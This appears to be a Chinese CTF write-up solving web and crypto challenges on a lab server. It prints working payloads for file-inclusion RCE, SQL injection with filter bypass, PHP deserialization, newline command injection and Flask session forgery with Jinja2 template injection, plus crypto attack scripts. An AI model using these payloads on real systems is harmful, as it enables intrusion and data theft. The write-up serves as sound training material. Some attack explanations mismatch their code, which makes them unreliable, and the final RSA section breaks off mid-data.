# Web

## 文件包含

题目页面提示存在文件包含漏洞，并且给出了一个参数 `?file=`。首先尝试使用 `data://` 协议和 base64 编码来查看目录下的文件，payload 为 `?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4=`，解码后得到 `<?php system("ls")?>`，执行后发现目录下存在 `flag.php` 和 `index.php` 两个文件。尝试直接读取 `flag.php`，发现对 flag 做了过滤。因此，需要再次使用 `data://` 协议和 base64 编码来构造 payload，`?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKT8+` 解码后为`<?php system("cat flag.php")?>`,绕过过滤。

```
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4=
```

```
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKT8+
```

---

## SQL注入

题目页面为一个登录框。首先尝试使用 `admin` 和 `admin"` 进行登录，发现页面报错，推断闭合方式为双引号。然后使用 `order by` 语句判断字段数，payload 分别为 `1" oorr 1=1 oorrder by 1#`，`1" oorr 1=1 oorrder by 2#`，`1" oorr 1=1 oorrder by 3#` 均返回正常，而 `1" oorr 1=1 oorrder by 4#` 报错，说明只有 3 列。接下来使用联合查询爆破表名，payload 为 `1" and 1=1 ununionion seselectlect 1,2,grrooup_concat(table_name) frroom infoorrmation_schema.tables whwhereere table_schema=database()#`，得到表名为 `flag` 和 `users`。继续使用联合查询爆破 `flag` 表中的列名，payload 为 `1" and 1=1 ununionion seselectlect 1,2,grrooup_concat(column_name) frroom infoorrmation_schema.columns whwhereere table_name='flflagag'#`，得到列名为 `flag` 和 `id`。最后使用联合查询获取 `flag` 表中的内容，payload 为 `1" and 1=1 ununionion seselectlect 1,2,grrooup_concat(flflagag) frroom flflagag#`

```sql
1" oorr 1=1 oorrder by 1#
1" oorr 1=1 oorrder by 2#
1" oorr 1=1 oorrder by 3#
1" oorr 1=1 oorrder by 4#
1" and 1=1 ununionion seselectlect 1,2,grrooup_concat(table_name) frroom infoorrmation_schema.tables whwhereere table_schema=database()#
1" and 1=1 ununionion seselectlect 1,2,grrooup_concat(column_name) frroom infoorrmation_schema.columns whwhereere table_name='flflagag'#
1" and 1=1 ununionion seselectlect 1,2,grrooup_concat(flflagag) frroom flflagag#
```

---

## 反序列化

题目提供了 PHP 源代码。代码中定义了两个类 `getflag` 和 `tmp`，`getflag` 类中有一个 `destruct` 魔术方法，当对象被销毁时，如果 `$file` 属性为 "flag.php"，则会输出 `flag.php` 的内容。`tmp` 类中存在一个 `construct` 构造方法，用于初始化 `$str1` 和 `$str2` 属性。代码中将 `easyeasyeasyeasyeasyeasyeasyeasyeasy` 和 `;s:4:"str2";0:7:"getflag":1:{s:4:"file";s:8:"flag.php";}}` 进行序列化，然后将序列化字符串中的 "easy" 替换为 "ez"。由于 "easy" 的长度为 4，"ez" 的长度为 2，替换后会导致反序列化时读取的长度出现偏差，使得 `;s:4:"str2";0:7:"getflag":1:{s:4:"file";s:8:"flag.php";}}` 中的一部分被当作 `str1` 的值，而 `str2` 则被解析为一个 `getflag` 对象。当反序列化完成后，`getflag` 对象被销毁，触发 `destruct` 魔术方法，输出 `flag.php` 的内容。

```php
<?php
class getflag
{
    public $file;

    public function __construct($file) {
        $this->file = $file;
    }

    public function __destruct()
    {
        if ($this->file === "flag.php") {
            echo file_get_contents($this->file);
        }
    }
}

class tmp
{
    public $str1;
    public $str2;

    public function __construct($str1, $str2)
    {
        $this->str1 = $str1;
        $this->str2 = $str2;
    }
}

$se = serialize(new tmp('easyeasyeasyeasyeasyeasyeasyeasyeasy',';s:4:"str2";0:7:"getflag":1:{s:4:"file";s:8:"flag.php";}}'));
echo $se;
echo "<br>";
$se = str_replace("easy", "ez", $se);
echo $se;
echo "<br>";
unserialize($se);
?>
```

```
POST DATA:
easy=easyeasyeasyeasyeasyeasyeasyeasyeasy&ez=;s:4:"str2";0:7:"getflag":1:{s:4:"file";s:8:"flag.php";}}
```

---

## 远程命令执行

题目页面提示可以执行命令，但过滤了包括 `|` 和 `&` 在内的所有分隔符。尝试使用 `%0a` 换行符进行绕过。首先使用 `ip=0%0asleep%205` 测试命令是否可以执行，发现页面响应时间确实延迟了 5 秒，说明可以执行命令。然后使用 `ip=0%0acat%20/flag>1.php` 将 `/flag` 文件的内容重定向到 `1.php` 文件中，最后访问 `1.php` 文件得到 flag `vmc{1InaktuDxtGZUQycG6eok2iG2iANqBKL}`。

```
ip=0%0asleep%205
```

```
ip=0%0acat%20/flag>1.php
```

---

## 模板注入

题目提示为 Python 的 Flask 框架。访问 `/nonono` 目录，发现源码泄露。分析源码，发现在 `/admin` 路由下存在对 session 的判断，要求 session 中存在字典对象 `role`，且 `is_admin` 字段为 1。同时，`render_template_string(message)` 处存在模板注入漏洞，会对 `flag` 字段进行注入。

首先访问 `http://10.12.153.8:30063` 并发送 POST 请求 `name=role`，从响应的 `Set-Cookie` 字段中可以获取到 session 的值。使用 base64 解码 session 的第一段数据，可以得到原始的 `role` 字典 `{"is_admin":0,"name":"test", "secret_key": "VGgxc0BvbmUhc2VDcmV0IQ=="}`。

由于 cookie 末尾有 HAMC 校验，需要使用脚本修改校验码。其中 `secret_key` 解密后得到 `Th1s@one!seCret!`。使用 `flask-session-cookie-manager` 工具伪造 cookie，将 `is_admin` 设置为 1，`flag` 字段设置为 `{{3*3}}`，得到新的 session 值。

使用 Hackbar 发送 POST 请求，并将伪造的 session 值添加到 Cookie 中，访问 `/admin` 路由，返回结果为 9，说明模板注入成功。

接下来尝试读取 flag。由于 `flask.config.Config` 类的 `__init__` 函数的全局变量中已经导入了 `os` 模块，因此可以使用 `config.__class__.__init__.__globals__` 调用 `os` 模块，使用 `popen()` 执行外部命令 `cat /flag`，再用 `read()` 函数读出内容。最终构造 payload 为 `{{config.__class__.__init__.__globals__.get('os').popen('cat /flag').read()}}`。

```python
# /nonono 源码
return rsp
@app.route('/nonono')
def source():
    f = open(__file__, 'r')
    rsp = f.read()
    f.close()
    return rsp[rsp.index('nonono'):]
@app.route('/admin')
def admin_handler():
    try:
        role = session.get('role')
        if not isinstance (role, dict):
            raise Exception
    except Exception:
        return 'No, you are a hacker!'
    if role.get('is_admin') == 1:
        flag = role.get('flag') or 'admin'
        flag = filter(flag)
        message = "%s, God bless you! The flag is " % flag
        return render_template_string(message)
    else:
        return "Error: Permission denied!"
    if __name__ == '__main__':
        app.run('0.0.0.0', port=80)
```

```python
# flask-session-cookie-manager encode
python .\flask_session_cookie_manager3.py encode -s 'Th1s@one!secret!' -t '{"role":{"is_admin":1,"name":"test","secret_key":"VGgxc0BvbmUhc2VDcmV0IQ==","flag":"{{3*3}}"}}'
```

```php
# 最终 payload
{{config.__class__.__init__.__globals__.get('os').popen('cat /flag').read()}}
```

---

# Reverse & Misc

- 多动手玩一玩没有什么难度
- 需要提示可以参考`anonymous report`

---

# Crypto

## 格密码

本题需要利用LLL算法进行格基约化。题目提供了两个大整数 h 和 p，以及一个由它们构建的矩阵。我们需要利用LLL算法对这个矩阵进行约化，得到一个更短、更规范的基。通过分析约化后的基，特别是第一个向量，我们可以推导出与原始矩阵相关的隐藏信息。这个隐藏的信息实际上是一个整数，将这个整数转换为字节串的形式，即可得到 flag。

```python
from Crypto.Util.number import *
from gmpy2 import invert

h = 311970364425799366998489758816351964614898164597015962390522858760089331210269507769408330245745888541705059882396722340774681935443615888403494901415226651295201132556613291289590900246992553502513664561058230713840616052310750850144077552701142563872837663789636304968423919464707545482008647087312063949024744195318160335652074407874634742273493108112212110123691909346846612115479023950119286716243604630664235633831784083300431161225131883065150778501178458601885263943907964612851841356128492283759401129349655263360496418606534637831065564054627124545266130146585012568948018083420026867791483624987951876329968315410612748989452628410331813540143425873481351220499681815979569479285905651270208308396719282247586008816711527598915797885618862654168623002012746684102245733757428828517277952675441290263051618987121956646671901357370585784409633697165339182406341764320293630983680416055584947772382282259966044517683538433409836256995980804901093405108581243143413703339657071622279140236369465154220363993923085583049720512383384577159975134910449465903227555419552492606439149153015674603047695345700309870206034743317361786333732070962362572427411597266252707397451423195512449103367120235737550650354427690243524900449675
p = 958396606448120961344481821891302529131234571519205540072533929007120447482644938027839069855225984909598017115601687321093037138370623689366302399472755221666720998204960391688686871213784218139146955110040572010513513710257471193690475085340782434134757767894370195789546551282060123540167285748706110004061656181247087025993389812671658906912145384679566372037915179523706023309666826191629634851598509448675340758156737530185937223948687001934035933966720541257653562031308634592003639145311246147664928094381997264652669457904886666262851691565920076364034433600062253014377522558972668765617631467665085324790312091927917199333642804731490452686230714946707520153374983386856748968281865500447110447064499127304576389450231449458997253721401398074788997192735673939296531420329207264490272774186484762804708405995307032141715953080254098506768585899454119852852002578252291310329200959476618660765556861112558404254680356703540148703891793429589128285327230398620737214653509556883409293525132433655639546382948760666188308135216174434756100646981938900940757869329579150360836505992616459066632938605335205569767007863591747811468281490752448411521431430302168214014717351186242150709061058943921599462022604009950194741903607
c = 767158168672362136291238223905378538545444315829681403660668665037917788547250510431680762324989504337886911129872811283399423182492713085621340850466620775416712732614020830060267436728824312319343522189998875569791210615658554329492772575522352284894778864900683043087475949382767603528807809596004213194946687583749277851731545121301799909443549367647188538291294493900118514585149301404415365107375148502163345229200555520367376148986792681776613941685900525114359918025093194374564154918465789098039688273260831196880453048787881692220588699313824407443049610470566611891830120455606865304514498141918370250200060333776115471607369861567714061571248634366226901360555240991881037749649258353302128601187117945261098036478588953880956746052307508140721683848770369771427200654010686745459084737649483182116223928908511586372587312845173805333061611628627699056444060210866689908925857413693914088384801590539118419817748706914585535977225375257595014121709225398146804929559026288825337416874187757876993164395155899845807880799091660701491902131855351054079661782867046531376623992742661604584530403794933640735943298254524984623808363772872836875750554022138997087590785362832339405833456398277842368920260448389099114876068641

mat = [[0, p], [1, h]]
M = Matrix(ZZ, mat)
a, g = M.LLL()[0]

m = (a*c % p*invert(a, g)*invert(a, g)) % g
flag = long_to_bytes(int(m))
print(flag)

# b'vmc{L4ttice_I5_pretty_easy_F0r_U!!!}'
```

---

## DSA签名

本题考察的是 DSA 签名算法中“共享 k”攻击的原理。题目提供了多组签名和对应的消息哈希值，这些签名使用了相同的随机数 k。由于 k 值被重复使用，我们可以利用这些签名之间的关系来计算出 k 值，进而推导出私钥 x。具体来说，我们通过分析多组签名中的 s 值和对应的消息哈希值 hash_m，计算它们之间的差值。利用这些差值之间的关系，我们可以构建一个方程组，并计算这些方程的最大公约数，从而得到参数 q。接着，我们可以根据 q 值和已知的签名信息，推导出 k 值，最终通过 k 值、签名 s 值、消息哈希值以及签名 r 值之间的关系计算出私钥 x。得到私钥 x 后，我们就可以对给定的消息进行签名验证，从而获得 flag。

```python
import socket  # 导入 socket 模块用于网络通信
import time  # 导入 time 模块用于时间控制
import math  # 导入 math 模块用于数学运算
from gmpy2 import invert  # 从 gmpy2 导入 invert 函数，用于求逆元
import hashlib  # 导入 hashlib 模块用于哈希计算

# 定义服务器的 IP 地址和端口
HOST = '10.12.153.8'
PORT = 31961
loop_times = 7  # 定义请求次数


def get_signatures():
    # 初始化签名和哈希值列表
    sign_s, hash_m = [], []
    for i in range(loop_times):
        print(f"\r获取到第{i + 1}组签名与消息", end='', flush=True)
        time.sleep(1.1 if i > 0 else 0)  # 等待一下，让服务端哈希值更新
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:  # 使用 with 语句管理 socket 连接
            try:
                s.connect((HOST, PORT))  # 连接到指定的主机和端口
                s.recv(1024)  # 接收初始响应
                s.send(b"1\n")  # 发送请求以获取签名和哈希值
                response = s.recv(1024).decode().split(",")  # 接收响应并解析
                sign_r = int(response[0])  # 提取签名 r 值
                sign_s.append(int(response[1]))  # 保存签名 s 值
                hash_m.append(int(response[2]))  # 保存消息哈希值
            except Exception as e:
                print("发生错误:", e)  # 捕获并打印异常
    return sign_r, sign_s, hash_m  # 返回最后一个 r 值和所有签名、哈希值


def compute_keys(sign_r, sign_s, hash_m):
    # 计算签名差值和哈希差值
    delta_s = [sign_s[i + 1] - sign_s[i] for i in range(len(sign_s) - 1)]
    delta_h = [hash_m[i + 1] - hash_m[i] for i in range(len(hash_m) - 1)]

    q = 0  # 初始化 q 值
    for i in range(2, len(delta_s)):
        # 计算 kq1 和 kq2，用于求解 q
        kq1 = abs(delta_s[i - 2] * delta_h[i - 1] -
                  delta_s[i - 1] * delta_h[i - 2])
        kq2 = abs(delta_s[i - 1] * delta_h[i] - delta_s[i] * delta_h[i - 1])
        kq = math.gcd(kq1, kq2)  # 计算 kq 的最大公约数
        q = math.gcd(q, kq) if q > 0 else kq  # 更新 q 值

    # 计算临时密钥 k 和密钥 x
    k = delta_h[0] * invert(delta_s[0], q) % q
    x = (k * sign_s[0] - hash_m[0]) * invert(sign_r, q) % q
    return q, k, x  # 返回计算出的 q, k, x


def send_final_signature(sign_r, sign_s):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:  # 使用 with 语句管理 socket 连接
        try:
            s.connect((HOST, PORT))  # 连接到指定的主机和端口
            s.recv(1024)  # 接收初始响应
            s.send(b"2\n")  # 发送请求以验证签名
            response = s.recv(1024)  # 接收响应
            signature_part = response.decode().split('"')[1]  # 提取签名部分
            to_check = int(hashlib.md5(signature_part.encode()
                                       ).hexdigest(), 16)  # 计算待检查的哈希值
            sign_s = (to_check + x * sign_r) * invert(k, q) % q  # 计算最终签名
            s.send(f"{sign_r}, {sign_s}\n".encode())  # 发送签名和 r 值
            final_response = s.recv(1024).decode()  # 接收最终响应
            final_response = s.recv(1024).decode().strip()  # 再次接收并去除空格
            print('\n\n', final_response, '\n\n')  # 打印最终响应
        except Exception as e:
            print("发生错误:", e)  # 捕获并打印异常


# 主程序
sign_r, sign_s, hash_m = get_signatures()  # 获取签名和哈希值
q, k, x = compute_keys(sign_r, sign_s, hash_m)  # 计算公钥和临时密钥
send_final_signature(sign_r, x)  # 发送最终签名
```

---

## 简单RSA

本题考察的是 RSA 加密算法中“低加密指数广播攻击”的原理。题目提供了多组 RSA 加密中使用的模数 n 和密文 c，并且这些加密使用了相同的加密指数 e (很可能是3)。由于不同的模数 n 之间可能存在相同的质因数 p 或 q，我们可以通过计算这些模数的最大公约数来尝试分解它们。如果最大公约数大于 1，说明存在共享的质因数，我们就可以利用这个质因数来分解对应的模数，进而计算出私钥并解密密文。简单来说，就是通过不断计算不同 n 之间的最大公约数，尝试找到它们的公共质因数，从而分解 n，最终解密得到 flag。

```python
import gmpy2
from Crypto.Util.number import long_to_bytes

n1 = 14311136148050672419989799427104593072360126727996357997737771323416025835284720893491268771893217645541031293941317348923695393578822127064753705575709943898954014710923499190306307017818318390870426431494240684558802605958320106573913876164986666561830970380943541512973969654875418388029963883263795540100294000652035421721153033158606886225047717035380694266340621241058788836739065168640629195395653804561942826938109892199374995491378415156147693480678475024810828139951747950220497130345509778576687918051304112321531099375758183212756982987812354817112831489097289915234500393466864136375176292077417921687591
c1 = 8202852785876270157863052002756570090495393573671910005596893574711032740799397936438752152316778125546684561981338463208326745896180102802370978316384870311169503381907548755600240181944292293100404896959898321176621546360167190501335724257238240403713094884305633523048639214129394823985010999561391781743707553324793755021757051461973597832982432346639642869313748849063526909019855981543807729556420488050052723152244834336120282794593657490451161292428134031108007189435605884011355136767968584350123097381476633363636607162409220915871083047432673676511990516075293548074046637736562426611866570077500698539680
n2 = 22460630266363520029013021830190111925329835544313855662313212281658578787408425121746654947555625278077070857950491561854244184358831593693401721178255080011283483166990848792925382062687461708064297371852747026491916479626204475066556067461737173240576845698707955971525234482303159455512217128800846697492645909822799706189901143541218109536441677917374991428785622511895854755385017003577998048914326930260299548055902668955263923329699864691566463108030209336765460544710136857719832988428394394769888465359508988507140048564837670939119403564949331948498516419572732361620147189572260923459583795866987431472081
c2 = 19432526669205632933281999861455073126026491878458861462621671904525045303797730344504664894989121738349412826500038805214988364882422697810525702555846266927049056573550455809225019296662813696615576976775557379322353977631701219576737211986654717188414587448855563253088294339676132929423451927193840172170831630957970119245046884198116729677995682724993252964058262130466937449364313778985085600422455117132498006037055650635335969965552319287195500774665911108494949571438011160394509085343201107394718958934368493483937533921994429464995605815197936150743857875518252748373785745134894438095024730301450741282453
n3 = 19992746611686250573671647760828360992790652451036608485720507826226043955859605408699699451019411863153770186932187717361941241622231255580260254382190262367584016091552087834953099478841911684756435739887399597301184520835065407680478222756923581533037301452594035962041816064218938028684243323353238297033311148235732893085634080009149876298111208271705744330460176345343233021475649651633865523828218112224430515495332970126197819600137819495585334361803576994675776334845387976082014911523417917110951173363569720887345722135810314736716071201425604128184784721804187807248872096097020325662816762510615645436571
c3 = 16761239931080052583119467254883044613843428027350731469077889755297092262423557561780949894774738153466792131508164424611538795049564635236315525530198686623671728115367282884740168549689217686122288333094825644587937316520469662154889810617075602455599097628405412912960405528988078488648702010584562028792787672783864514722323122218797620445952080240913471402410015623219514189511849780521859190708136293642508967973582651262544468081041064272940196809701633056064725146113742596400325295624752267310145921728201937132472951530120140732967263171552147743333230746840533608857664162331567733570997571556980494505239
n4 = 14921019826845713229726484877726270689241984653233268169688581852222590026842979172232582201402351497096998635751451613780807919110829778250462314819294132840793361485689131884323905476990345344800354500999858720835604109955299649188824263262669855070670628208634166768950607071709626319152810191066883413750048659163843436449669170112757598763514534870597389082424678999448930303733468731977925649728447952296168606875381663955587878344578094143259273354224725300090671948728897863727697421927341322881916785053396241076618270994707195235790442124786541590007807595576441777573453034209389536619042112736318910325443
c4 = 12104686397227931738546574591380357622718178963781492437624997870522237479459381810675815758685789724824313573784023039145284572968062809536304287761460797042217424459047221638130036481992030911937893114466061516306456345748133768987953527429987096596623215114426732278065630014608792807941320949416675074089844010060080921581229069604896558377581847155615744077237097571536222960051367929483415114503862879052522687638568271435493496076230228746863486426062385692270549241536559384169613474232448181941652396294943544455326954005366751933697950468829610423401267530652463253552042799027022764104040446616376787931262
n5 = 15272117973129901152469934169722584048788617147757632365791658800750926957768612286888655116918215974078040294515078885318068654960150527447692598365088831811318995117764230964044314038653716203717859969703738041008028610260162032852230191129230669874776941136044240565959807731829332386524847728126521323260017315161990238212645767574135949869496033390177430205791394909637449063992173085079787248905055073067988314706720450392314407632759345179381055339164316392960259203496045265143504969702593896637060523554936600159946787412996100488023723444073375164457093841750815749630727650631728835961802439288652334603699
c5 = 532297764293374431345319135535171240943045095118219366603669734014040206220242931909329515668555766603866714403157308728341132357911855102211146534373024920996222861666636331003591302316949272206703801068406427074138926340739839088705439896695034187068266797961518069038409308780210449954657401069006825070712684945411758748948053987788727397125874879525408625499123038021849139152296839592866703874403912296503961242361567822221589253466316231297080976876879308748352796893535008780461957623716084138624526943379136680045925661302308904677210858883806926960136050804664180676876621068489103165553870202604910995376
n6 = 18127445565190266841827299756408077665043095777650452035033831588763995250624530226449665578869899110759577972695623880503477133385907626279488761885382985633639158084738586514921778278865555245046914680629518749458804403715569886973918541812080562181172650152502537375812891519048771588558082901204334158435252420515643904211799472847301722784898572678150897515798405098712379089818245129648803474141927125771800505244427082093944945185718686900289000905220781484367689812209400844758941386387687906381241190162863125419104564432734478849541810862091617652273228009230499783892890115058385198859611734403581802226249
c6 = 2625551961520404822614319606750443223876109845986978449151552936165052835749320005616623196600993458605095692554096855097708637686395841605169785299974081565211071562756383216779434333914364702548682103868142599355338105838477768408407890186681959208882692900392416470186936290224911113828252994437329629224782258411200582637781334626739579364350628562723437287922536352184401820922080861455065326765600711933303305357435210407951675455959745201471975055113425613549118728398786287459590835602915250133309913998661270053053432537991582471485775363429365803053660902542066262325929134649526894392488264686353472291858
n7 = 25237660992000441783172540924847901949806255476314654124494383045994148743356940942874440881134542667025560951339481569248423701914672738098714921038919656013069298866778354991939846296089547559885794448902624003971729162137167779783831440124242627534249857061025395057022758192195177674589080120150420376436821217724603838445185443572474812746620205786353221045209307079281670355293602682023415982568245346832251186821302831580750259178166736133209805179750561812054051649147603891176221687183017285450487422460530968797430297529765912950971240264980005481524829778501446609450861098784049198495969035740974313640899
c7 = 9758510052958978102948228334244869415165545109949510690189969202323542658592737853436921895896043005877526302279472466168422359921314039734929206526881778897067215647448266071512675649702774441944204282736857844920408229618077379117600268298609365142116955969115516459293315364107943215961013155993930752669360414805051578461860895483051303295323035671380094695239371154702653128168720030747483907996025437103350598863926938687075304844605508496789347812093047555407980728165302731410858261186919424953215143824645606262477453433776500347616509302859390460838136875303489356615422369128295995697637647427439868512713
n8 = 19955533170458662985761804452932449390593987518346562969898631299352201545989831893281460148412578517369526658720919482088707995320166109420916639891241308064221944701870005800204762179119680918106851022692518283361744328592294747241881314329848700511911793997624474016287850999414088344863968543717229037324417972590306738893549445237225520016321591983071408545934897016157332798449236458315361699529350506615556348312839445922025118648372865971639732379049406524589404975922736703232700351701473395236257592011553525644430624257716575279594923098275250572920192237624282328232519490104798953285753444652595899325957
c8 = 5022433753545584574117143031265627519908700017841852901138347971391945531323938738554352208060507403852953111947660248378367376641166912935132106560475177447748171664309944096414351572774023692450018139372858073849291842984156603507644503465873113426624118216783446696139091851402504511649519500241874169560056201292888688576629583893408839693395504785358607277756283059836657157634021296323632131586516047266988531300889762998547827434860640455346645237261137583933232042892176045160395713238138369323003278436265032180107440685789185485462210316833781034956658234384694961710079505566144177559766383151016855335339
n9 = 20608859199634918194130601032088539577415284572777850653607410127132207005192265019309019164896422332029145172996783380959321298059319995774401880466279250204140649254796534391070043342181336200002503879904615736004828008926607372732441420607420584367190978626924020480151314284284271853775842020380995071916692220803063585709257634315562577825188623291317610474409190581346471579851384173607854992048115105358643136393989630879508396409064130776969846093322028735610922546423654322949611587521946393195118630449197252203349181158400840617839925338111062535072205440412314897070869886866764427944393070693426107294061
c9 = 10050192344410608998068935375429239665670771519187387860605372443607032600329268146513824254947276553686922523385845186737194846802836526138869569581385508315470455867035385142239183398889710456190235351535042176553076510518297665588409475479055316588612397841445501393454840325279804411511615924369341032269701298276225067067804199514896732689438177467900600611801904132486240038071882239572810172242699299213898596749424528782386605914162076213853512549652177688327788657065676937153434280062393407135432363197473014592849343623564548612342563086319095383330615202341497407758655556539832050197369002526050470369599
n10 = 20805806285184049632494903182037898656796626777130488655004407970221271788165331882237257708603925314800420354895662217494864226959645625070075239215473861715722541741630553384259977713513434100926736696035584681939841921802247690220451066139553223351054942828702790914990631163295186943011164531235577767867026158764389595894194881442438953294426783321898101463208326465639358833221243860132035703135961314186234724441766419253351861465289474724009012132776673656968918735723071233452819815473094463291660853832477326891639373777507662161915777525496490832324659772926373787182948210159495450928991214205652815330869
c10 = 9015884859671622552932005389012646083555572003693004412203185009302291900722481874063759253219711489647937724537174211736617547805446849940178318477773239764757765227817207167959108716372580334865271965514294712352538984676415148679080318564492200186995778605026902573402392252129229000029591988698410733858036585245384330203994610513481342765008508698708246744811783368314010882533900522609878773176859749919592970286877545921479814172431906082707504673496510271590855659018837819464864298105570193152298748220192028719030743533832435738266779004010636016620678768943552808013803769508977675662405020601347549475802

n = [n1, n2, n3, n4, n5, n6, n7, n8, n9, n10]
c = [c1, c2, c3, c4, c5, c6, c7, c8, c9, c10]

for i in range(len(n)):
    for j in range(i + 1, len(n)):
        gcd = gmpy2.gcd(n[i], n[j])
        if gcd != 1:
            p = gcd
            q = n[i] // p
            phi = (p - 1) * (q - 1)
            d = gmpy2.invert(65537, phi)
            m = gmpy2.powmod(c[i], d, n[i])
            flag = long_to_bytes(int(m))
            print(flag)
            break

# b'vmc{This_is_really_easy_rsa_HAHAAAA}'
```

---

## 分组密码工作模式

本题考察的是 CBC 模式下的字节翻转攻击。题目提供了一个服务器地址和端口，我们需要通过与服务器交互来进行攻击。首先，我们向服务器发送请求创建一个账户，并获取服务器返回的 token，这个 token 中包含了加密后的用户信息。我们的目标是通过修改 token 的前一部分（用户密钥），使得解密后的用户信息变为 AdminAdmin!。由于 CBC 模式的特性，我们可以通过异或操作来控制解密后的明文。具体来说，我们将 token 的前 32 个字节作为用户密钥，并将其与我们已知的明文 HUSTCTFer! 和目标明文 AdminAdmin! 进行异或运算，得到新的用户密钥。然后，我们将新的用户密钥和原始 token 的后半部分拼接起来，发送给服务器进行验证。由于服务器端使用相同的密钥进行解密，因此我们修改后的用户密钥会导致解密后的明文发生相应的变化，最终得到我们想要的 AdminAdmin!，从而获得 flag。

```python
import socket

HOST = '10.12.153.8'  # 服务器地址
PORT = 32014          # 端口号

# 创建 socket 连接
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    try:
        s.connect((HOST, PORT))  # 连接到服务器
        s.recv(1024)  # 接收初始消息

        s.send(b"1\n")  # 发送创建账户请求
        s.recv(1024)  # 接收中间响应

        # 接收token
        response = s.recv(1024).decode()
        start_index = response.find("token:") + len("token: ")
        end_index = response.find("\n", start_index)
        token = response[start_index:end_index].strip()

        # 计算用户密钥
        user_key = bytes.fromhex(token[:32])  # 前32个字节为user_key
        cur = b'HUSTCTFer!______'
        tar = b'AdminAdmin!_____'
        user_key = bytes([user_key[i] ^ cur[i] ^ tar[i]
                         for i in range(len(cur))])

        s.send(b"3\n")  # 发送登录请求
        s.recv(1024)  # 接收中间响应

        # 发送计算后的用户密钥和密文
        s.send(f'{user_key.hex() + token[32:]} \n'.encode())
        s.recv(1024)  # 接收中间响应

        # 输出最终响应
        print("\n\n", s.recv(1024).decode(), "\n")
        s.send(b"4\n")  # 发送退出请求

    except Exception as e:
        print("发生错误:", e)
```

---

## 古典密码破译

本题考察的是三阶希尔密码的破解。题目提供了三组密文和对应的两组明文以及一个明文字符。希尔密码的加密过程可以表示为密文向量乘以加密矩阵得到明文向量的逆过程。由于我们已知了两组明文和密文，以及一个额外的明文字符，我们可以通过枚举未知的两个明文字符来构建完整的明文矩阵。然后，利用已知的明文和密文对，我们可以计算出加密矩阵。最后，利用得到的加密矩阵对密文进行解密，如果解密出来的明文都是可打印字符，那么我们就得到了正确的解密结果。简单来说，就是通过枚举未知的明文字符，构建明文矩阵，然后计算加密矩阵，最后对密文进行解密，验证解密结果的正确性。

```python
# 建议使用SageMath在线运行
# https://cocalc.com/features/sage

from Crypto.Util.number import *
raw = b'>u\x10l9\npI,0\x04^J\x00ib\x03\x0c\x158d\x1f\x08Ixk\nF\x19fz\x14PT\x04\x03>R~'
rawi = [int(x) for x in raw]

p = matrix(Zmod(127), 3, 3, [118, 109, 99, 123, 0, 0, 125, 32, 32])
c = matrix(Zmod(127), 3, 3, [62, 117, 16, 108, 57, 10, 62, 82, 126])

for i in range(0, 127):
    for j in range(0, 127):
        p[1, 1] = j
        p[1, 2] = i
        flag = True
        if p.is_invertible():
            K = p.solve_right(c)
            decode = ''
            for k in range(13):
                tmp = matrix(Zmod(127), 1, 3, rawi[k*3:(k+1)*3])
                A = K.solve_left(tmp)
                for l in range(3):
                    char = chr(A[0, l])
                    if not char == ' ' and not char.isprintable():
                        flag = False
                        break
                    decode += char
                if flag is False:
                    break
            if flag is True:
                print(f"{i},{j}|{decode}")

# vmc{d8euED8uaj47SUIie34uI9Weo01pdKiD}
```

---

## RSA加密算法

本题考察了 Wiener 攻击的原理和应用。题目给定了两个 RSA 模数 n1 和 n2 以及对应的密文 c1 和 c2，并且已知这两个模数拥有非常接近的 p 和 q。我们可以通过 n1/n2 的连分数展开来逼近 q1/q2 的值。具体来说，我们首先计算 n1 除以 n2 的结果，然后对这个结果进行连分数展开，并计算其各项的渐进分数。在这些渐进分数中，某个分数的分母可能是 q1 的一个很好的近似值。然后，我们可以通过验证 n1 是否可以被这个近似值整除来判断它是否是 q1。如果找到了 q1，我们就可以进一步计算出 p1，然后利用 p1 和 q1 计算出 phi1，进而计算出私钥 d1，最终解密 c1。类似地，我们可以利用 p1 的下一个素数 p2 作为 n2 的一个质因数的近似值，计算出 q2，进而计算出 phi2，得到私钥 d2，最终解密 c2。将 c1 和 c2 的解密结果拼接起来，即可得到 flag。

```python
from Crypto.Util.number import *
import gmpy2
n1 = 27682578737141139764880192910976946263355689816882797515059917479242862799083599745594956880258244112867559722435850732812023189662581052511287867553308318268020022386306820424829898858029986193412922645944359409248568131057377380697236238480724883073062491532254626363468032145049953168789073328812076794158602028961853986034378144749656228541552641207393473830715156452473432130040360471566096165146087202836036783304640579183082301858529818598032339821237841219774124710789761912675044056265735587753304064079484844965820681168729776560497921764083742448045654891113500035063474318442078036531813957551086231747079155691690001433127187382636049871228279519466735719768798574776353687049667125384146566107739705553580693984918816215940308884007192621418304753551998125658993859095063641090798574130161651257890916914325076137436869018454577522833
c1 = 14360977893873474578201937159000122429359790977572665232657843468076201963407780015131857192621550737338805880514393357390576423731328871867241029260294051045710144482989801857054158816998897546124709802730198690244128545073634486145786763294634081834588146373913232490890078533918320777534358739106486350300547206365723045306767038214923412032633833255742963954701475401704385045019069883734625251436409851588044241336835452728962860280865504000103361559688861149086469939940113748174610019620309023214292662384279070127090992947332945432141695583191136521301940116585610033790348125114471980285332011918355578839128892075058698885319243593345096734776497817461251643381989958326810478500026684389358920342021836572511688796450072700142033952403561408907486022094802237175920044147084170050294965826258250618675638343726352907476393474128674488943
e1 = 138906518221471521524404330039616633297752765534176570868900039237133419857485415639423196636068397237296224442083213768630488100717977884415342104239280950424735129147986053115335928783190377695248250926374734988108972136349625965753649992146322810352768246041575396721661142246729747572832017510241749082431
n2 = 27682578737141139764880192910976946263355689816882797515059917479242862799083599745594956880258244112867559722435850732812023189662581052511287867553308576254232706953290519059976159239205559295965110148734449650209977235953163255494808056707188551192674128213090005439928085856216617642935948961573449294338310127166077195263402939848861686214485115686799032901147314759348481062418109120418661302585413868782602282463165171129063197961455779193665041902822948963032580054067050227612838335828201043413949164885293325493829570131849345344856137656453666135670724974184749115550720826497558763320127218251970576144750319782121194483563545371157323166968983176013145267856898865437101799958588342741257457472036311490402279982286349929050116350394664561659857216725849236910894778018502118673902399095646487808462155207034764432342699549109080808769
